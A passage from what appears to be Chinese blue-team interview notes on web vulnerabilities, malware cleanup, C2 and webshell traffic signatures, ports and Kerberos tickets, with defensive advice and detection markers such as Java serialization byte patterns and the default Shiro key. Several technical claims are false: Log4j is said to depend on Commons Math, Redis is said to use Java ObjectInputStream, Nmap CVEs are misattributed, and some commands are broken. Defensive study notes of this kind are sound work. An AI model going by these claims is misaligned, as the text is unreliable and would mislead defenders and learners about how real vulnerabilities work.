文件包含漏洞</h3><p>原理：</p><p>文件包含方式：Web应用程序通常会使用动态脚本语言（如PHP、ASP等）来动态地生成网页内容。其中，文件包含函数（如include、require等）允许将一个文件的内容嵌入到另一个文件中，以实现模块化和重用性。当Web应用程序采用用户输入作为文件路径参数时，如果未对这些参数进行足够的过滤和验证，就可能导致恶意数据或代码被动态地加载到页面中。攻击者可以通过向文件路径参数中注入恶意代码或文件名来触发文件包含漏洞，并在服务器上执行恶意操作。例如，攻击者可以上传一个包含恶意代码的文件，并将其作为文件路径参数传递给目标服务器，从而执行恶意操作。</p><p>防御：</p><ol><li>过滤和验证用户输入：在接收用户输入作为文件路径参数时，必须对其进行过滤和验证，确保其中不包含任何恶意数据或代码。</li><li>使用绝对路径而非相对路径，以避免攻击者通过注入如../等文件路径跳出当前目录并访问其他文件。</li><li>限制访问范围：为了防止攻击者利用文件包含漏洞攻击服务器上的敏感文件，可以通过配置文件访问权限和文件夹安全策略等方式来限制访问范围。</li><li>升级和更新软件：Web应用程序中经常会存在许多漏洞和安全风险，因此需要及时升级和更新相关软件和组件，以确保最新的补丁和安全措施已经被采纳。</li></ol><h3 id="10-中间件常见漏洞"><a href="#10-中间件常见漏洞" class="headerlink" title="10. 中间件常见漏洞"></a>10. 中间件常见漏洞</h3><ol><li>Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。</li><li>数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。</li><li>应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。</li><li>消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。</li><li>缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。</li><li>中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。</li></ol><h3 id="11-挖矿病毒"><a href="#11-挖矿病毒" class="headerlink" title="11. 挖矿病毒"></a>11. 挖矿病毒</h3><p>判断：</p><p>当我们的服务器或PC资源(CPU)使用率接近或超过100%，并持续高居不下导致服务器或PC操作延缓，我们就可以判定被挖矿</p><p>防御：</p><ul><li>及时更新杀毒软件，并开启实时保护模式；</li><li>扫描整个系统，清除所有恶意文件和注册表项；</li><li>禁止不明程序自启动，及时关闭被感染的进程；</li><li>在安装软件时仔细阅读许可协议，禁止安装未知来源的软件；</li><li>加强账户权限管理，限制非管理员用户对系统的操作权限；</li><li>及时备份重要文件，以便在恶意软件攻击后恢复数据。</li></ul><h3 id="Linux确认挖矿"><a href="#Linux确认挖矿" class="headerlink" title="Linux确认挖矿"></a>Linux确认挖矿</h3><p>a. 使用<code>top</code>命令查看系统性能，找出消耗资源较高的进程PID；</p><p>b. 根据获取的PID信息利用<code>ps -ef -p PID</code>命令找出系统进程详细信息；</p><p>c. 根据进程详细信息定位到文件位置，进入文件位置进行文件分析，确认是否属于挖矿程序。</p><p>d.</p><p>停止服务：<code>systemctl stop *.service</code>；</p><ul><li>杀掉进程：<code>kill 9 PID</code>，很多时候不光杀掉一个进程；</li><li>删除文件：<code>rm -fr abnormal_file</code>，删除文件时可以使用<code>find / -name abnormal_file</code>查找出系统中所有的恶意文件；</li><li>清理定时任务：<code>crontab -e</code>；</li></ul><h3 id="Windows确认挖矿"><a href="#Windows确认挖矿" class="headerlink" title="Windows确认挖矿"></a>Windows确认挖矿</h3><ul><li><p>使用图形化界面分析确认</p><p>a. 打开<code>任务管理器</code>：<code>Ctrl + Alt + Delete</code> 快捷键 或者 <code>win + r</code> 快捷键，输入 <code>taskmgr</code>；</p><p>b. 在<code>任务管理器</code>中找到<code>资源管理器</code>；</p><p>c. 通过<code>资源管理器</code>找到占用CPU资源较高的服务或进程，获取其PID信息；</p><p>d. 利用获取的PID信息在<code>任务管理器</code>中的<code>详细信息</code>一栏中找到对应的程序，右键<code>打开文件位置</code>，获取异常文件目录；</p><p>e. 进入到异常文件目录中，对文件进行分析，确认是否属于挖矿程序；</p><p>f. 确认挖矿程序后，先对挖矿程序进行备份。然后先关闭对应的服务与进程，再删除对应的定时任务，最后删除对应的文件。在删除文件之后，反向再查询一遍定时任务、进程与服务，最好是在间隔一定时间段后再复查一次</p></li></ul><h3 id="12-webshell"><a href="#12-webshell" class="headerlink" title="12. webshell"></a>12. webshell</h3><p>原理：Webshell是一种Web服务器上的恶意代码，可以使攻击者远程控制服务器，并执行各种命令、上传下载文件等操作<br>防御：</p><ol><li>配置必要的防火墙，并开启防火墙策略，防止暴露不必要的服务为攻击者提供利用条件。</li><li>对服务器进行安全加固，例如，关闭远程桌面功能、定期更换密码、禁止使用最高权限用户运行程序、使用 HTTPS 加密协议等。</li><li>加强权限管理，对敏感目录进行权限设置，限制上传目录的脚本执行权限，不允许配置执行权限等。</li><li>安装 Webshell 检测工具，根据检测结果对已发现的可疑 Webshell 痕迹立即隔离查杀，并排查漏洞。</li><li>排查程序存在的漏洞，并及时修补漏洞。可以通过专业人员的协助排查漏洞及入侵原因。</li><li>时常备份数据库等重要文件。</li><li>需要保持日常维护，并注意服务器中是否有来历不明的可执行脚本文件。</li><li>采用白名单机制上传文件，不在白名单内的一律禁止上传，上传目录权限遵循最小权限原则。</li></ol><h3 id="13-钓鱼邮件"><a href="#13-钓鱼邮件" class="headerlink" title="13. 钓鱼邮件"></a>13. 钓鱼邮件</h3><p>原理：<br>伪装成合法的邮件，诱骗收件人点击链接或输入个人信息，从而达到窃取用户信息、密码或者安装恶意软件的目的。钓鱼邮件常常伪装成银行、电商、社交媒体等常见网站的邮件，利用用户对这些网站的信任感，诱导用户点击邮件中的链接或下载附件，从而实施攻击</p><p>防御：</p><ol><li>查看发件人地址：钓鱼邮件的发件人地址通常会伪装成合法、可信的机构或公司，但是如果您仔细查看发件人地址，就可能发现其不是该机构或公司真正的域名。</li><li>检查链接地址：钓鱼邮件中通常会包含可疑的链接，如果您将鼠标悬停在链接上，就可以看到链接的真实地址。如果该地址与邮件内容不符，就可能是钓鱼邮件。</li><li>注意邮件内容：钓鱼邮件通常会给人留下一种紧急、必须立即采取行动的感觉，从而诱骗用户点击链接或执行某些操作。因此，如果您收到这样的邮件，请仔细阅读邮件内容，并多加思考和确认。</li><li>尽量避免下载附件：钓鱼邮件通常会携带恶意附件，如果您无法确认邮件的真实性，最好不要下载或打开这些附件，以免被感染。</li><li>安装反钓鱼软件：有一些反钓鱼软件可以帮助用户检测和拦截钓鱼邮件，例如 Google 的 Password Alert 等。</li></ol><h3 id="14-fastjson"><a href="#14-fastjson" class="headerlink" title="14. fastjson"></a>14. fastjson</h3><p>原理：</p><p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type来试图把JSON内容反序列化为对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。常见的有sun官方提供的一个类com.sum.rowset.JdbcRowSetlmpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用。</p><p>漏洞复现：</p><p><img src="https://s1.ax1x.com/2023/05/26/p9qFE0x.png" alt=""></p><p>防御：</p><ul><li>避免直接将未经过验证的用户输入传递给 fastjson 反序列化器</li><li>及时更新 fastjson 序列化库，以确保其安全性</li><li>使用其他序列化和反序列化库，例如Gson和Jackson等，来避免fastjson漏洞的风险</li></ul><h3 id="15-shiro"><a href="#15-shiro" class="headerlink" title="15. shiro"></a>15. shiro</h3><p>原理：</p><p>Apache Shiro框架提供了记住密码的功能(RememberMe)，用户登录成功后会将用户信息加密，加密过程：用户信息-》序列化-》AES加密-》BASE64编码-》RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的RememberMe字段里面，在服务端收到请求对RememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;=1.2.4中使用了默认密钥kPH+blx5D2deZilxcaaaA==，更容易触发RCE漏洞</p><p>防御：</p><ol><li>避免直接从未经过验证的输入数据中反序列化对象。</li><li>限制反序列化器（如 ObjectInputStream）的使用，只反序列化可信来源的数据。</li><li>及时更新Shiro框架，以确保漏洞已被修复。</li><li>将Shiro部署在安全环境中，并使用网络隔离、网络监控和入侵检测等技术来加强安全控制。</li></ol><p>shiro550和721的区别：</p><ol><li>主要在于shiro550使用已知密钥碰撞，只要有足够密钥库，不需要RememberMe Cookie</li><li>shiro721的AES加密的key基本猜不到，系统随机生成，可使用登录后的rememberme去爆破正确的key值，即利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造RememberMe Cookie值来实现反序列化漏洞攻击，难度高</li></ol><h3 id="16-log4j"><a href="#16-log4j" class="headerlink" title="16. log4j"></a>16. log4j</h3><p>原理：</p><p>Log4j是Java中广泛使用的一种日志管理工具，攻击者可以利用Log4j来执行任意代码，以下是此漏洞的原理：Log4j依赖于Apache Commons Math库中的一个子模块以解析日志消息中的数学表达式。这个库使用了JNDI（Java命名和目录接口）技术，JNDI允许开发人员将Java对象绑定到命名空间中，以供其他Java应用程序使用。攻击者可以通过构造特制的请求，将恶意的JNDI名称注入到Log4j中，从而诱骗Log4j调用该JNDI名称代表的对象，例如远程服务器上的恶意Java类。当Log4j尝试解析JNDI名称时，它会触发恶意JNDI资源的加载，并在其中执行恶意代码。</p><p>危害：</p><ol><li>远程代码执行：攻击者可以利用此漏洞在目标系统上执行任意代码，可能导致机密信息泄露、数据损坏和系统崩溃等问题。</li><li>远程命令执行：攻击者可以利用此漏洞在目标系统上执行任意命令，例如下载和安装恶意软件、创建后门访问等。</li></ol><p>防御：</p><ol><li>更新Log4j版本：最新版本已经修复了此漏洞。</li><li>关闭JNDI：如果您不需要使用JNDI，建议禁用该功能。</li><li>阻止外部网络访问：对于架构设计合理的应用程序，应该使用网络隔离等技术来限制外部访问。</li><li>加强应用程序安全性：开发人员应该定期审计和更新应用程序代码，以确保其安全性和完整性。</li></ol><h3 id="补充：weblogic"><a href="#补充：weblogic" class="headerlink" title="补充：weblogic"></a>补充：weblogic</h3><p>weblogic是Oracle发布的一个基于JAVA架构的web中间件，可以理解为tomcat promax</p><p>漏洞利用：</p><ol><li>直接通过T3发送恶意反序列化对象</li><li>利用T3协议配合RMP或ND接口反向发送反序列化数据</li><li>通过javabean XML方式发送反序列化数据</li></ol><h3 id="17-redis（缓存服务器）"><a href="#17-redis（缓存服务器）" class="headerlink" title="17. redis（缓存服务器）"></a>17. redis（缓存服务器）</h3><p>原理：Ridic反序列化漏洞的根本原因是，Redis使用了Java标准库中的ObjectInputStream类来处理数据的序列化和反序列化。攻击者可以通过构造恶意请求，并将其发送到目标Redis服务器上，以触发ObjectInputStream在处理该数据时执行恶意代码的情况。</p><p>危害：</p><ol><li>提升权限：攻击者可以通过远程执行任意代码进一步攻击目标系统，例如窃取敏感信息、破坏系统完整性、创建后门等。</li><li>篡改数据：攻击者可以修改Redis数据库中的数据，例如覆盖现有数据、添加新的键值对等。</li><li>删除数据：攻击者可以利用此漏洞删除Redis数据库中的数据，包括重要的配置文件、认证令牌等。</li></ol><p>防御：</p><ol><li>不要直接将未经过验证的用户输入数据存储在Redis数据库中。</li><li>更新Redis版本以确保漏洞已修复。</li><li>配置Redis服务器的安全设置，例如限制网络访问和使用密码进行身份验证等。</li><li>启用日志记录并监测Redis服务器上的异常活动。</li><li>将Redis服务器部署在安全环境中，并定期对其进行安全审计。</li></ol><h3 id="18-nmap"><a href="#18-nmap" class="headerlink" title="18. nmap"></a>18. nmap</h3><ol><li>CVE-2016-3714: ImageMagick命令注入漏洞</li></ol><p>Nmap使用ImageMagick库来处理图像，在旧版本的ImageMagick中存在命令注入漏洞。攻击者可以构造恶意图像文件，通过Nmap执行这些文件的时候触发该漏洞，导致执行任意命令。</p><ol><li>CVE-2017-11615：脚本引擎环境变量注入漏洞</li></ol><p>Nmap支持在其脚本引擎中执行Lua脚本，而在某些情况下，攻击者可以利用环境变量注入漏洞来执行恶意Lua脚本，从而危及系统安全。</p><ol><li>CVE-2018-15173: 路径遍历漏洞</li></ol><p>该漏洞存在于Nmap HTTP服务器中，攻击者可以利用此漏洞通过HTTP服务在目标系统上执行任意命令</p><p>防御：<br>这些漏洞大多数已经被修复，并且很少会对最新版本的Nmap构成威胁。建议用户始终使用最新版本的Nmap，并遵循最佳实践，如限制对Nmap的访问权限，避免使用默认帐户和密码，以及定期更新配置文件等。</p><h3 id="19-反序列化漏洞与JAVA内存马"><a href="#19-反序列化漏洞与JAVA内存马" class="headerlink" title="19. 反序列化漏洞与JAVA内存马"></a>19. 反序列化漏洞与JAVA内存马</h3><p>原理：网站暴露或间接暴露反序列化 API，导致攻击者构造恶意对象并上传到服务器触发反序列化过程，调用反序列化函数如_wakeup、_destruct等，攻击者可以实现自定义这些反序列化函数的参数从而引发漏洞</p><p>Java反序列化检测：</p><ol><li>从流量中发现序列化的痕迹，关键字：<code>ac ed 00 05</code>，<code>rO0AB</code></li><li>Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是<code>1099</code>端口</li><li>从源码入手，可以被序列化的类一定实现了<code>Serializable</code>接口</li><li>观察反序列化时的<code>readObject()</code>方法是否重写，重写中是否有设计不合理，可以被利用之处</li></ol><p>防范： </p><ul><li>类白名单校验：在 ObjectInputStream 中 resolveClass 里只是进行了 class 是否能被 load ，自定义 ObjectInputStream , 重载 resolveClass 的方法，对 className 进行白名单校验</li><li>禁止 JVM 执行外部命令 Runtime.exec</li></ul><p>内存马分类：</p><ul><li>1、基于动态添加Servlet组件的内存马</li><li>2、基于动态添加框架组件的内存马</li><li>3、基于Javaagent和Javassist技术的内存马</li></ul><p>特征：</p><ul><li><p>内存马的特性就是无文件落地，只存在内存中，这就代表了这个类对应的Resource是不在本地文件系统中的，那么其Class File/Location/Loader相较于应用正常的组件会有一定的区别。</p></li><li><p>因为内存马毕竟最后还是要依赖框架的功能来实现的，必然会继承或实现框架的接口，在应用自身提供的接口不多的情况下，通过遍历所有的servlet/filter/listener进行审计也是一种检测的策略</p></li></ul><p>排查：</p><ul><li>如果是jsp注入，日志中排查可疑jsp的访问请求。</li><li>如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</li><li>根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</li><li>如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</li><li>如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</li></ul><p>防御：</p><ul><li><p>正常内存马重启以后就没有了</p></li><li><p>可以做内存镜像，反编译.class，看具体代码，然后注入进去，覆写相关的恶意类即可</p></li><li>也可以做比对，看是否新增恶意的类</li></ul><h3 id="20-Rookit"><a href="#20-Rookit" class="headerlink" title="20. Rookit"></a>20. Rookit</h3><p>分类：</p><ul><li><p>用户态Rootkit：一般通过覆盖系统二进制和库文件来实现</p><p>特点：</p><ol><li><p>通常替换的二进制文件为ps、netstat、du、ping、lsof、ssh、sshd等</p></li><li><p>可能使用环境变量LD_PRELOAD和/etc/ld.so.preload、/etc/ld.so.conf等加载黑客自定义的恶意库文件来实现隐藏</p></li><li><p>可能直接在现有进程中加载恶意模块来实现隐藏</p></li><li><p>不依赖于内核</p></li></ol></li><li><p>内核态Rootkit：通常通过可加载内核模块（LoadableKernel Module，LKM）将恶意代码被直接加载进内核中。</p><p>特点：</p><ol><li><p>直接访问/dev/{k,}mem</p></li><li><p>更加隐蔽，更难以检测，通常包含后门</p></li></ol></li></ul><p>排查：</p><ul><li><p>利用Chkrootkit检查Rootkit</p></li><li><p>利用Rkhunter检查Rootkit</p></li><li>就是将一些重要的文件作MD5，定期检查MD5是否有改变</li></ul><p>常见功能：隐藏文件、进程、连接、模块等</p><h3 id="21-蠕虫"><a href="#21-蠕虫" class="headerlink" title="21. 蠕虫"></a>21. 蠕虫</h3><p>原理：蠕虫病毒是一种智能化、自动化并综合网络攻击、密码学和计算机病毒技术，可自行运行的攻击程序或代码。蠕虫病毒能够扫描和攻击网络上存在系统漏洞的节点主机，并通过网络自主的从一个节点传播到另一个节点。</p><p>主要攻击方法：</p><p>Rsh，rexec：用户的缺省认证</p><p>Sendmail 的debug模式</p><p>Fingerd的缓冲区溢出</p><p>口令猜测</p><p>特征：</p><ul><li>主动攻击：从搜索漏洞，到利用搜索结果攻击系统，再到攻击成功后复制副本，整个流程全由蠕虫自身主动完成。</li><li>利用软件漏洞：蠕虫利用系统的漏洞获得被攻击的计算机系统的相应权限，使之进行复制和传播过程成为可能。</li><li>造成网络拥塞：在传播的过程中，蠕虫需要判断其它计算机是否存活；判断特定应用服务是否存在；判断漏洞是否存在等等，这将产生大量的网络数据流量。同时出于攻击网络的需要，蠕虫也可以产生大量恶意流量，当大量的机器感染蠕虫时，就会产生巨大的网络流量，导致整个网络瘫痪。</li><li>留下安全隐患：大部分蠕虫会搜集、扩散、暴露系统敏感信息（如用户信息等），并在系统中留下后门。</li><li>行踪隐蔽：蠕虫的传播过程中，不需要用户的辅助工作，其传播的过程中用户基本上不可察觉。</li><li>反复性：即使清除了蠕虫留下的任何痕迹，如果没有修补计算机系统漏洞，网络中的计算机还是会被重新感染。</li><li>破坏性：越来越多的蠕虫开始包含恶意代码，破坏被攻击的计算机系统，而且造成的经济损失数目越来越大。</li></ul><p>防御：</p><ul><li>系统漏洞打补丁：蠕虫病毒大多数都是利用系统漏洞进行传播的，因此在清除蠕虫病毒之前必须将蠕虫病毒利用的相关漏洞进行修补。</li><li>清除正在运行的蠕虫进程：每个进入内存的蠕虫一般会以进程的形式存在，只要清除了该进程，就可以使蠕虫失效。</li><li>删除蠕虫病毒的自启动项：感染蠕虫主机用户一般不可能启动蠕虫病毒，蠕虫病毒需要就自己启动。需要在这些自启动项中清除蠕虫病毒的设置。</li><li>删除蠕虫文件：可以通过蠕虫在注册表的键值可以知道病毒的躲藏位置，对于那些正在运行或被调用的文件无法直接删除，借助相关工具删除。</li><li>利用自动防护工具：通过包括个人防火墙软件等防护工具，可以设置禁止不必要的服务。另外也可以设置监控自己主机有那些恶意的流量。</li></ul><h3 id="22-XXE漏洞"><a href="#22-XXE漏洞" class="headerlink" title="22. XXE漏洞"></a>22. XXE漏洞</h3><p>原理：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。</p><p>特征：在HTTP的Request报文出现一下请求报文，即表明此时是采用XML进行数据传输，就可以测试是否存在XML漏洞。</p><p>漏洞利用：</p><p>有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为 blind xxe（类似于布尔盲注、时间盲注），可以使用外带数据(OOB)通道提取数据</p><p>防御：</p><p>XXE漏洞归根结底在于XML文档解析引入外部实体，禁止加载外部实体。</p><p>使用安全的libxml依赖库，版本在2.9以上的版本</p><h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><h3 id="1-cs-（client-server）"><a href="#1-cs-（client-server）" class="headerlink" title="1. cs （client/server）"></a>1. cs （client/server）</h3><p>cs流量是指基于客户端和服务器之间的通信产生的网络流量。C/S 流量特征包括以下几个方面：</p><p><strong>cs的流量特征：50050端口，心跳包</strong></p><ol><li>会话建立：C/S 流量通常都需要进行会话建立，包括握手、协议版本交换、密钥协商等过程。在这个过程中，通常可以看到一些特定的协议字段和标志位。</li><li>数据传输：传输数据是 C/S 流量的主要特征之一。在这个过程中，通常可以看到明文或加密的数据传输，并且数据大小和传输速度也是分析流量的重要指标。</li><li>响应时间：C/S 流量通常包含请求和响应消息，因此可以通过分析请求和响应之间的时间差来判断系统性能和服务质量。</li><li>协议类型：C/S 流量涉及多种不同的协议类型，例如 HTTP、FTP、SMTP、POP3 等，每种协议的特点和流量特征也有所不同。</li><li>应用程序特点：C/S 流量还表现出应用程序的特点，例如应用程序的请求方式、请求频率、用户行为等等</li></ol><h3 id="2-msf"><a href="#2-msf" class="headerlink" title="2. msf"></a>2. msf</h3><p>MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：</p><ol><li>目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。</li><li>异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。</li><li>频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。</li><li>数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。</li><li>特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等</li></ol><h3 id="3-冰蝎"><a href="#3-冰蝎" class="headerlink" title="3. 冰蝎"></a>3. 冰蝎</h3><p>3.0：</p><ol><li>content-type</li><li>Accept&amp;Cache-Control</li><li>内置16个ua头</li><li>content-length请求长度</li></ol><p>4.0：v3.0 和 v4.0 的区别很明显在于这里 <code>$_SESSION[&#39;k&#39;]=$key</code>，v3.0 版本当中会把 key 作为 session 传入；接着判断 <code>extension_loaded</code>，也就是判断服务端是否存在 <code>openssl</code>拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 <code>xor_base64</code>加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 <code>aes</code>加密方式。</p><ol><li>使用HTTP协议：冰蝎使用HTTP协议与C&amp;C服务器通信，从而绕过网络策略和防火墙的检测。</li><li>自定义加密：冰蝎使用自定义加密算法对数据进行加密，以避免被网络监测器和安全设备检测到。</li><li>动态命令: 通过inline和eval函数动态执行指令并返回结果，这使得冰蝎可以运行各种自定义代码，例如扫描目标、下载和安装其他恶意软件等。</li><li>内存驻留: 冰蝎不需要在受感染设备上安装文件或建立持久性，它只需要注入进程并在内存中驻留，从而难以被传统杀毒软件检测和清除。</li><li>支持多平台：冰蝎支持Windows, Linux, and Mac OS等操作系统，这使得攻击者可以在跨多个平台上远程控制受感染设备。</li></ol><h3 id="4-蚁剑"><a href="#4-蚁剑" class="headerlink" title="4. 蚁剑"></a>4. 蚁剑</h3><p><img src="https://s1.ax1x.com/2023/05/26/p9qFwcj.png" alt=""></p><h3 id="5-菜刀"><a href="#5-菜刀" class="headerlink" title="5. 菜刀"></a>5. 菜刀</h3><p><img src="https://s1.ax1x.com/2023/05/26/p9qF0js.png" alt=""></p><h3 id="6-sql注入"><a href="#6-sql注入" class="headerlink" title="6. sql注入"></a>6. sql注入</h3><p>分两个维度吧，一个是应用本身产生的，一个是真实的攻击，比如说因为出现select关键字而触发安全设备告警的情况下，首先需要判断下是不是SQL语句还是参数名为select关键字导致的误报，如果不是误报，那就看SQL语句写的是啥，判断是否有危害，还是业务的SQL语句，可以看里面是不是包含恶意的函数或者敏感的高危操作，如果都没有那就跟业务去确认是不是应用本身代码设计缺陷导致直接把SQL语句在参数中传输</p><h3 id="7-哥斯拉"><a href="#7-哥斯拉" class="headerlink" title="7. 哥斯拉"></a>7. 哥斯拉</h3><p><img src="https://s1.ax1x.com/2023/05/26/p9qFd3Q.png" alt=""></p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><ol><li>端口 21（FTP）：FTP服务常用于文件传输，常见漏洞包括弱口令、任意文件上传漏洞等。</li><li>端口 22（SSH）：SSH是远程登录系统的协议，常见漏洞包括弱口令、暴力破解、身份验证绕过等。</li><li>端口 23（Telnet）：Telnet是一个远程控制协议，常见漏洞包括明文传输敏感信息、会话劫持等。</li><li>端口 25（SMTP）：SMTP是发送电子邮件的标准协议，常见漏洞包括垃圾邮件滥用、反射攻击等。</li><li>端口 53（DNS）：DNS是域名解析服务，常见漏洞包括DNS缓存投毒、DDoS攻击等。</li><li>端口 80/443（HTTP/HTTPS）：HTTP/HTTPS是Web服务器常用的协议，常见漏洞包括SQL注入、XSS跨站脚本攻击、文件上传漏洞等。</li><li>端口 135（RPC）：RPC是远程过程调用协议，常见漏洞包括缓冲区溢出、拒绝服务攻击等。</li><li>端口 139/445（SMB）：SMB是Windows系统的文件共享协议，常见漏洞包括远程代码执行、密码破解等。</li><li>端口 3389（RDP）：RDP是Windows远程桌面协议，常见漏洞包括弱口令、暴力破解、远程代码执行等。</li><li>6379：redis</li><li>7001：weblogic</li><li>8080：TCP、HTTP协议代理服务器，Apache-tomcat默认端口号</li></ol><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="1-判断误报"><a href="#1-判断误报" class="headerlink" title="1. 判断误报"></a>1. 判断误报</h3><p>真正的攻击会大量的占用网络空间，传输效率会降低，占用大量带宽，对系统造成损害，没有的话就是误报。</p><p>其次可以去观察请求特征，与正常的业务是否一样，去做一个对比</p><p>再有一种情况，比如一个邮箱（OA系统，vpn都是这个情况），有人连续尝试好几次密码都错了，那两种可能，一种他真的忘了，另一种就是有人要搞他，那这种时候就去联系甲方驻场人员，跟他说明情况，然后建议他给邮箱禁了，如果是个正常用户他再用的话肯定就会提示他联系管理员，有人联系了就说明他是个误报，没人找的话就这样封着，如果一直没人理那就说明是个正常告警，然后还可以看时间段，确实也有人凌晨登录，但是正常企业单位凌晨再登录就很不正常，这个时候可以看一下他的ip地址，如果是攻击，那他的ip地址一定是代理池，而且其实护网的时候大家都会遵循一个宗旨，就是宁可错杀也不漏杀，不确定情况的时候，就先去联系这个人问清楚</p><p>在复杂一点的就比如抓了一个包，发现他的请求不太对，就非常像攻击特征，然后就查看那个包，去看http请求，分析一下这个流量里面请求的目的地址到底是啥，才能知道是不是误报</p><p>如果是个sql注入，就不用分析到底是不是误报，直接封，因为正常用户都是用鼠标点击，根本就不会注入</p><h3 id="2-WAF分类"><a href="#2-WAF分类" class="headerlink" title="2. WAF分类"></a>2. WAF分类</h3><ol><li>基于签名的 WAF：基于签名的 WAF 通过检测请求中是否包含已知漏洞的特征，来拦截攻击。这种类型的 WAF 可以快速识别和阻止已知的攻击方式。</li><li>基于行为的 WAF：基于行为的 WAF 使用机器学习、人工智能等技术来分析请求的行为模式，并判断其是否具有攻击性。这种类型的 WAF 能够较好地识别未知攻击。</li><li>综合型 WAF：综合型 WAF 结合了基于签名和基于行为两种技术，能够同时检测已知攻击和未知攻击，提供更加全面的保护。</li></ol><h3 id="3-正向shell与反向shell的区别"><a href="#3-正向shell与反向shell的区别" class="headerlink" title="3. 正向shell与反向shell的区别"></a>3. 正向shell与反向shell的区别</h3><p>正向shell是攻击者主动攻击，连接到目标主机；反向shell是用户主动连接攻击者</p><ol><li>正向shell</li></ol><p>正向shell通常是在目标主机上启动一个服务端程序，等待用户连接并进行身份验证后，允许用户在该主机上执行命令。因此，正向shell需要用户能够直接连接到目标主机，并且需要提供一些身份验证方式来保障安全性。</p><ol><li>反向shell</li></ol><p>反向shell则是在攻击者主机上启动一个客户端程序，通过网络连接到目标主机并执行指定的命令或脚本。这种方式通常需要绕过防火墙和其他安全措施，利用漏洞或社会工程学技巧获取目标主机的网络访问权限。</p><h3 id="4-态势感知原理"><a href="#4-态势感知原理" class="headerlink" title="4. 态势感知原理"></a>4. 态势感知原理</h3><p>就是当攻击发生时，流量经过交换机，就会被探针抓取到，然后传给态势感知的服务器，然后回去特征库里进行一个匹配，匹配成功的话就是一个攻击，会提交给防火墙，进行禁用，匹配不成功的话，就视为正常客户访问，再生成日志文件，显示在客户端</p><h3 id="5-黄金票据和白银票据的区别"><a href="#5-黄金票据和白银票据的区别" class="headerlink" title="5. 黄金票据和白银票据的区别"></a>5. 黄金票据和白银票据的区别</h3><p><strong>1.访问权限不同</strong></p><ul><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ul><p><strong>2.加密方式不同</strong></p><ul><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ul><p><strong>3.认证流程不同</strong></p><ul><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ul><h3 id="6-样本溯源"><a href="#6-样本溯源" class="headerlink" title="6. 样本溯源"></a>6. 